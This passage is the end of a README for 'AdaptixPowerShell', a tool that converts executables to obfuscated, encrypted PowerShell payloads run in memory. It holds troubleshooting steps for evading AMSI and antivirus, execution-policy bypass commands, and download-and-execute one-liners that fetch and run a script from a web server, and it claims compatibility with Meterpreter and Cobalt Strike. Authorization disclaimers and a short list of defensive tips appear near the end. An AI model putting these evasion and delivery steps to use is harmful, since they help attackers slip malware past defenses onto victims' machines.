**Q: How do I test if it works?**  
A: Use debug mode:
```bash
python3 adaptixpowerShell.py test.exe -l 3 -d
```
The payload will show decryption and execution information.

### Size and Performance

**Q: My 1.7 MB putty.exe created an 8 MB payload that doesn't work. Why?**  
A: Large executables create very large PowerShell payloads that exceed reliable execution limits. Solutions:
1. Use smaller executables (< 500 KB)
2. Generate shellcode with msfvenom instead
3. Use a custom payload designed for in-memory execution

**Q: Which architecture should I use?**  
A: 
- `--arch 2` (x64) for modern Windows (recommended, smaller payload)
- `--arch 3` (x86+x64) for maximum compatibility (larger payload)
- `--arch 1` (x86) only for legacy systems

**Q: How long does generation take?**  
A: 
- Small files (< 100 KB): < 1 second
- Medium files (100-500 KB): 1-3 seconds
- Large files (1 MB+): 5-10 seconds
- Depends on obfuscation level and system speed

---

## 🐛 Troubleshooting

### Installation Issues

#### Issue: "donut module not found"

```bash
# Solution: Install donut
pip3 install donut-shellcode

# Or from requirements
pip3 install -r requirements.txt

# Verify installation
python3 -c "import donut; print('Donut installed successfully')"
```

### Donut Module Not Found

If you get an error about donut not being installed:

```bash
# Install donut-shellcode
pip3 install donut-shellcode

# Or install from requirements.txt
pip3 install -r requirements.txt
```

### Donut Manual Installation

If pip installation fails, you can install donut manually:

```bash
git clone https://github.com/TheWover/donut
cd donut
pip3 install .
```

### Testing Donut Conversion

To verify donut is working correctly:

```bash
# Use a SMALL test file (< 100 KB recommended)
python3 adaptixpowerShell.py small_test.exe -l 3 -d

# Check output for "Converting test.exe to shellcode using donut..."
# Verify payload size is reasonable (< 2 MB)
ls -lh *.ps1
```

### Architecture Compatibility

- Use `--arch 3` (default) for maximum compatibility (x86+x64)
- Use `--arch 2` for x64-only targets (smaller payload size)
- Use `--arch 1` for x86-only targets (legacy systems)

### Performance Issues

#### Issue: "Generation is slow"

**Causes:**
- Large input file
- High obfuscation level (4-5)
- Slow system

**Solutions:**
```bash
# Use lower obfuscation level
python3 adaptixpowerShell.py large.exe -l 1  # Much faster

# Or disable obfuscation entirely
python3 adaptixpowerShell.py large.exe --no-obfuscate
```

### Execution Issues

#### Issue: "Script blocked by execution policy"

```powershell
# Bypass execution policy
powershell -ExecutionPolicy Bypass -File payload.ps1

# Or in the download command
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://...')"
```

#### Issue: "AMSI detected malicious content"

**The tool includes AMSI bypass, but if it fails:**
```bash
# Try different bypass mode
python3 adaptixpowerShell.py payload.exe --bypass 2 -l 5

# Or increase obfuscation
python3 adaptixpowerShell.py payload.exe -l 5
```

### Debug Tips

```bash
# Enable debug output
python3 adaptixpowerShell.py test.exe -l 3 -d

# Check payload size
ls -lh *.ps1

# Test locally first
python3 -m http.server 8000
# Then on the same machine:
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://localhost:8000/payload.ps1')"
```

---

## 🎯 Summary

AdaptixPowerShell is a comprehensive payload generation framework that combines:

✅ **Direct .exe to shellcode conversion** (Donut integration)  
✅ **Military-grade encryption** (XOR with random keys)  
✅ **Sophisticated obfuscation** (Chimera-style techniques)  
✅ **AMSI bypass** (Reflection-based)  
✅ **In-memory execution** (Fileless attack technique)  
✅ **Multiple delivery methods** (Direct, Base64, File)  
✅ **Flexible architecture support** (x86, x64, dual-mode)  
✅ **5 obfuscation levels** (Balance stealth vs. size)

### Key Advantages

- **No manual shellcode generation needed** - Convert .exe directly
- **Different signature every time** - Randomized obfuscation
- **Works with any payload** - Meterpreter, Cobalt Strike, custom tools
- **Bypass modern defenses** - AMSI, static detection, simple signatures
- **Production-ready output** - Complete with multiple execution methods

### When to Use This Tool

✅ Authorized penetration testing  
✅ Red team operations  
✅ Security research and training  
✅ Testing defensive capabilities  
✅ Malware analysis research  

### When NOT to Use This Tool

❌ Unauthorized access  
❌ Malicious purposes  
❌ Without proper authorization  
❌ In violation of laws or regulations  

---

## 📚 Additional Resources

### Related Tools

- **[Donut](https://github.com/TheWover/donut)** - Shellcode generation from executables
- **[Chimera](https://github.com/tokyoneon/Chimera)** - PowerShell obfuscation inspiration
- **[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)** - Advanced PowerShell obfuscation

### Learning Resources

- **Donut Documentation**: https://github.com/TheWover/donut/tree/master/docs
- **AMSI Bypass Techniques**: Research various reflection-based methods
- **In-Memory Execution**: Study process injection and reflective loading
- **Obfuscation Techniques**: Learn about string manipulation and dead code

### Community

- Report issues and contribute at the project repository
- Follow responsible disclosure practices
- Share techniques with the security research community

---

## 🏆 Credits

### Inspired By

- **[Chimera](https://github.com/tokyoneon/Chimera)** by @tokyoneon
  - PowerShell obfuscation techniques
  - String chunking methodology
  - Variable randomization approach

- **[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)** by @danielbohannon
  - Advanced obfuscation concepts
  - Backtick injection techniques
  - PowerShell evasion strategies

- **[Donut](https://github.com/TheWover/donut)** by @TheWover
  - Position-independent code generation
  - PE to shellcode conversion
  - Cross-architecture support

### Technologies Used

- **Python 3** - Core scripting language
- **PowerShell** - Target execution environment
- **Donut** - Shellcode generation engine
- **C# P/Invoke** - Windows API interaction

### Contributors

This tool combines research and techniques from the offensive security community. Special thanks to all researchers who share their knowledge publicly.

---

## 📜 License

This project is provided "as-is" for **educational and research purposes only**.

### Terms of Use

1. **Permitted Use:**
   - Educational research and learning
   - Authorized penetration testing
   - Security training and awareness
   - Defensive security research (blue team)
   - Malware analysis and study

2. **Prohibited Use:**
   - Unauthorized computer access
   - Malicious attacks or harm
   - Distribution of malware
   - Any illegal activities
   - Violations of computer crime laws

3. **Requirements:**
   - Explicit written authorization for testing
   - Controlled, isolated testing environments
   - Compliance with all applicable laws
   - Responsible disclosure of vulnerabilities
   - Ethical use at all times

### Liability

The authors and contributors assume **NO LIABILITY** for:
- Misuse of this tool
- Damage caused by this tool
- Illegal activities conducted with this tool
- Consequences of unauthorized access

By using this software, you agree to these terms and accept full responsibility for your actions.

---

## ⚠️ Final Notes

### Important Reminders

1. **Always Get Authorization**
   - Written permission before testing
   - Clear scope and boundaries
   - Document everything

2. **Test Responsibly**
   - Use isolated environments
   - Don't test on production systems
   - Have rollback plans

3. **Stay Legal**
   - Know your local laws
   - Follow ethical guidelines
   - Report vulnerabilities responsibly

4. **Continuous Learning**
   - Security is constantly evolving
   - Defenders improve their techniques
   - Stay updated on new methods

### Defensive Recommendations

For defenders and blue teams:
- Monitor PowerShell execution patterns
- Implement application whitelisting
- Use behavior-based detection
- Enable PowerShell logging (Module/Script Block logging)
- Monitor memory allocations
- Implement network segmentation
- Regular security awareness training

### Tool Limitations

This tool helps evade **static detection**, but remember:
- Behavioral analysis still works
- Memory forensics can detect it
- Network traffic may reveal patterns
- Advanced EDR learns over time
- Perfect evasion doesn't exist

**The best defense is understanding the attack.**

---

## 📞 Support

For issues, questions, or contributions:
- Check the [FAQ](#-faq) first
- Review [Troubleshooting](#-troubleshooting) section
- Open an issue on the project repository
- Follow responsible disclosure practices

---

**Thank you for using AdaptixPowerShell responsibly!**

*Last Updated: January 2026*
